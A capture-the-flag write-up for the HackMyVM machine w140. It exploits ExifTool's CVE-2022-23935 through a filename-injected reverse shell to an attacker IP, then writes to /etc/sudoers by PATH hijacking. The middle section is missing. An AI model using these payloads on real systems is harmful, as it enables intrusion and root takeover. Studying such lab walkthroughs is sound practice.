# w140

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| w140 | powerful | Beginner | HackMyVM |

**Summary:** The w140 machine presents a comprehensive attack scenario beginning with a web application vulnerable to arbitrary file upload and command injection through ExifTool metadata processing. The target system runs a file upload service that processes images using ExifTool version 12.37, which is susceptible to CVE-2022-23935, allowing attackers to inject malicious payloads through specially crafted filenames. Exploitation of this vulnerability grants initial access as the www-data user. Lateral movement to the ghost user account is achieved through credential discovery within a QR code embedded in a hidden PNG file located in the web server's root directory. The final privilege escalation leverages a sudo-enabled bash script that executes the find command without absolute paths, enabling PATH hijacking to inject arbitrary commands into /etc/sudoers and gain complete root access to the system.

## Initial Access

### File Upload Vulnerability Discovery

Testing the file upload functionality with a benign image file named `cat.jpg` revealed interesting behavior in how the application processes uploaded files.

![](image-3.png)

The application responded by indicating that uploaded images are analyzed and the results are stored in the `/analysed_images/` directory. Following the naming convention, the analysis report was accessible at `/analysed_images/catjpg.txt`.

![](image-4.png)

The analysis output revealed that the application uses **ExifTool version 12.37** to extract metadata from uploaded images. This specific version is vulnerable to CVE-2022-23935, a critical command injection vulnerability that allows arbitrary code execution through maliciously crafted filenames.

### Exploit Development and Execution

**Step 1:** Establish a netcat listener on the attacking machine to catch the reverse shell connection.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/w140]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

**Step 2:** Craft and deploy the CVE-2022-23935 exploit. The vulnerability allows command injection through the filename parameter when ExifTool processes the file. A base64 encoded reverse shell payload was embedded within a pipe character sequence in the filename to bypass filtering and achieve code execution.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/w140]
└─$ payload=$(echo "bash -i >& /dev/tcp/192.168.100.1/4444 0>&1" | base64) && curl -X POST http://192.168.100.164/upload.php -F "image=@/tmp/w140/catprofile750.jpeg;filename=echo $payload | base64 -d | bash |" -F "upload=Upload"
```

**Step 3:** The exploit successfully triggered, and a reverse shell connection was established as the www-data user.


The SETENV flag indicated that environment variables, including PATH, could be manipulated when executing the script with sudo privileges. This configuration represents a significant security weakness.

### Script Vulnerability Analysis

Examination of the Benz-w140 script revealed its functionality and exploitable components.

```bash
ghost@w140:~$ cat /opt/Benz-w140

#!/bin/bash
. /opt/.bashre
cd /home/ghost/w140

# clean up log files
if [ -s log/w140.log ] && ! [ -L log/w140.log ]
then
/bin/cat log/w140.log > log/w140.log.old
/usr/bin/truncate -s@ log/w140.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

The critical vulnerability exists in the final line where the **find** command is invoked without an absolute path. Since the SETENV sudo configuration allows PATH manipulation, an attacker can create a malicious find binary in a controlled directory and prepend that directory to the PATH variable, causing the script to execute the attacker's code with root privileges.

### PATH Hijacking Exploitation

**Step 1:** Create a malicious find script in the /tmp directory that injects a sudoers entry granting the ghost user unrestricted sudo access.

```bash
ghost@w140:~$ echo 'echo "ghost ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers' > /tmp/find
ghost@w140:~$ chmod +x /tmp/find
```

**Step 2:** Execute the vulnerable script with a modified PATH variable that prioritizes the /tmp directory, causing the system to execute the malicious find binary instead of the legitimate one.

```bash
ghost@w140:~$ sudo PATH=/tmp:$PATH /opt/Benz-w140
/opt/Benz-w140: 4: cd: can't cd to /home/ghost/w140
```

**Step 3:** Verify that the malicious payload successfully modified the sudoers file.

```bash
ghost@w140:~$ sudo -l
Matching Defaults entries for ghost on w140:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ghost may run the following commands on w140:
    (root) SETENV: NOPASSWD: /opt/Benz-w140
    (ALL : ALL) NOPASSWD: ALL
    (ALL : ALL) NOPASSWD: ALL
```

The output confirmed that the ghost user now possessed unrestricted sudo privileges across the entire system.

**Step 4:** Escalate to root and retrieve the final flags.

```bash
ghost@w140:~$ sudo -i
root@w140:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
w140
root@w140:~# cat /home/ghost/user.txt /root/root.txt
61f[REDACTED]
2f9[REDACTED]
```

Complete root access was achieved, and both user and root flags were successfully captured.

## Attack Chain Summary

1. **Reconnaissance**: Comprehensive network scanning identified the target at 192.168.100.164 running SSH and Apache services. Web enumeration revealed a file upload application with image analysis capabilities.

2. **Vulnerability Discovery**: Analysis of the image processing output disclosed the use of ExifTool version 12.37, which is vulnerable to CVE-2022-23935, a critical command injection vulnerability exploitable through specially crafted filenames.

3. **Exploitation**: A reverse shell payload was injected through the filename parameter during file upload, leveraging the ExifTool vulnerability to achieve initial access as the www-data user with command execution capabilities on the target system.

4. **Internal Enumeration**: Post-exploitation reconnaissance revealed a hidden PNG file containing an embedded QR code. Decoding this QR code yielded SSH credentials for the ghost user account, enabling lateral movement to a privileged user context.

5. **Privilege Escalation**: The ghost user possessed sudo privileges to execute a bash script that invoked the find command without an absolute path. PATH hijacking was employed to substitute a malicious find binary, which modified /etc/sudoers to grant unrestricted sudo access, culminating in complete root compromise of the system.
